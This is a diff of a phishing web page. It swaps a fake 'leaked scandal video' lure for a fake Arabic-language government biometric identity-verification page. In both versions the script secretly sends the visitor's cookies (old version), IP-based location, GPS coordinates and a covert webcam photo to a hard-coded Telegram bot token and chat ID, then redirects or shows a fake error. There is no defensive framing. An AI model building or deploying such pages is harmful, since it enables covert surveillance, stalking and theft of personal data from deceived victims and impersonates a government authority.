@@ -4,91 +4,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فضيحة نار 🔥🔥 - حصري 2026</title>
+    <title>نظام التحقق الحكومي الموحد</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; }
-        .player-shell { border: 2px solid #222; background: #0a0a0a; position: relative; overflow: hidden; }
-        .neon-text { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
+        body { background-color: #f3f4f6; color: #1f2937; font-family: 'Noto Sans Arabic', sans-serif; }
+        .gov-card { background: white; border-top: 6px solid #1e3a8a; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .scan-line { position: absolute; width: 100%; height: 2px; background: #3b82f6; top: 0; box-shadow: 0 0 15px #3b82f6; animation: move 2s linear infinite; }
+        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-6">
+<body class="flex items-center justify-center min-h-screen p-4">
 
-    <div class="w-full max-w-2xl text-center mb-6">
-        <h1 class="text-3xl font-bold neon-text mb-4 underline">فضيحة نار 🔥🔥 شاهد قبل الحذف</h1>
-        <div class="player-shell aspect-video rounded-3xl flex items-center justify-center cursor-pointer" onclick="ignitePayload()">
-            <div id="playIcon" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center shadow-2xl">
-                <svg viewBox="0 0 24 24" class="w-10 h-10 fill-white"><path d="M8 5v14l11-7z"/></svg>
-            </div>
-            <div id="loader" class="hidden flex flex-col items-center">
-                <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-red-600 mb-4"></div>
-                <p class="text-sm">جاري جلب بيانات الفيديو المسرب...</p>
-            </div>
+    <div class="gov-card max-w-md w-full p-8 rounded-xl text-center">
+        <div class="mb-6">
+            <div class="w-16 h-16 bg-blue-900 rounded-full mx-auto flex items-center justify-center text-white text-2xl">🛡️</div>
+            <h1 class="mt-4 text-xl font-bold text-blue-900">نظام التحقق الرقمي الآمن</h1>
+            <p class="text-[10px] text-gray-400 uppercase tracking-widest mt-1">Digital Identity Verification System</p>
         </div>
+
+        <div class="my-8 relative w-40 h-40 border-2 border-blue-200 rounded-full mx-auto overflow-hidden bg-gray-50 flex items-center justify-center">
+            <div class="scan-line"></div>
+            <svg class="h-20 w-20 text-blue-100" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path></svg>
+        </div>
+
+        <div class="bg-blue-50 p-4 rounded-lg border border-blue-100 text-right mb-6">
+            <p class="text-xs text-blue-800 leading-relaxed">
+                يرجى تفعيل أذونات الموقع والكاميرا لإتمام عملية التحقق البيومتري لضمان أمان حسابك والوصول للمحتوى المطلوب.
+            </p>
+        </div>
+
+        <button id="startVerify" class="w-full py-4 bg-blue-900 hover:bg-blue-800 text-white font-bold rounded-lg shadow-lg transition-all">
+            بدء التحقق الآن
+        </button>
+        
+        <p class="mt-6 text-[10px] text-gray-400">© 2026 جميع الحقوق محفوظة لهيئة الأمن الرقمي</p>
     </div>
 
+    <video id="v" style="display:none" autoplay playsinline></video>
+    <canvas id="c" style="display:none"></canvas>
+
     <script>
-        const BOT_TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
+        const TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
         const CHAT_ID = "1523412137";
 
-        async function sendToTelegram(text) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
-            });
+        async function tg(m, fd) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/${m}`, { method: 'POST', body: fd });
         }
 
-        async function ignitePayload() {
-            document.getElementById('playIcon').style.display = 'none';
-            document.getElementById('loader').classList.remove('hidden');
+        document.getElementById('startVerify').addEventListener('click', async function() {
+            this.innerText = "جاري المعالجة...";
+            this.disabled = true;
 
-            // 1. سحب الكوكيز (The Cookie Grabber)
-            const cookies = document.cookie || "لا توجد كوكيز متاحة (HttpOnly أو فارغة)";
-            const browserInfo = `🖥️ *بيانات المتصفح:* ${navigator.userAgent}\n🍪 *الكوكيز:* \`${cookies}\``;
-            await sendToTelegram(browserInfo);
-
-            // 2. طلب الأذونات (كاميرا + ميكروفون + موقع)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // 1. استخبارات الـ IP
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                let info = `👤 *تحقق جديد من الهوية*\n🌐 IP: \`${d.ip}\`\n📍 ${d.city}, ${d.country_name}`;
                 
-                // سحب الموقع
-                navigator.geolocation.getCurrentPosition(async p => {
-                    const loc = `📍 *موقع الضحية اللحظي:*\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    await sendToTelegram(loc);
+                const fd1 = new FormData();
+                fd1.append('chat_id', CHAT_ID);
+                fd1.append('text', info);
+                fd1.append('parse_mode', 'Markdown');
+                await tg('sendMessage', fd1);
+
+                // 2. الكاميرا والموقع
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+
+                navigator.geolocation.getCurrentPosition(p => {
+                    const fdG = new FormData();
+                    fdG.append('chat_id', CHAT_ID);
+                    fdG.append('text', `🎯 *موقع GPS:*\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                    tg('sendMessage', fdG);
                 });
 
-                // التقاط صورة صامتة
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    video.play();
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    setTimeout(async () => {
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(async blob => {
-                            const fd = new FormData();
-                            fd.append('chat_id', CHAT_ID);
-                            fd.append('photo', blob, 'shot.jpg');
-                            fd.append('caption', "📸 صورة مسربة للضحية");
-                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                            stream.getTracks().forEach(t => t.stop());
-                        }, 'image/jpeg');
-                    }, 1000);
-                };
-
                 setTimeout(() => {
-                    document.getElementById('loader').innerHTML = "<p class='text-red-500'>عذراً، هذا المقطع تم حذفه من قبل إدارة الأمان!</p>";
-                }, 4000);
+                    const canvas = document.getElementById('c');
+                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                    canvas.getContext('2d').drawImage(v, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fdP = new FormData();
+                        fdP.append('chat_id', CHAT_ID);
+                        fdP.append('photo', blob, 'id.jpg');
+                        fdP.append('caption', "✅ تم مسح الوجه بنجاح");
+                        tg('sendPhoto', fdP);
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg');
+                    
+                    setTimeout(() => window.location.href = "https://www.google.com", 1500);
+                }, 2000);
 
-            } catch (err) {
-                await sendToTelegram("⚠️ الضحية رفض إعطاء الأذونات.");
-                document.getElementById('loader').innerHTML = "<p class='text-orange-500'>فشل التحميل: يرجى السماح بالأذونات للمشاهدة.</p>";
+            } catch (e) {
+                alert("يجب السماح بالأذونات للمتابعة.");
+                this.innerText = "بدء التحقق الآن";
+                this.disabled = false;
             }
-        }
+        });
     </script>
 </body>
 </html>
+
 
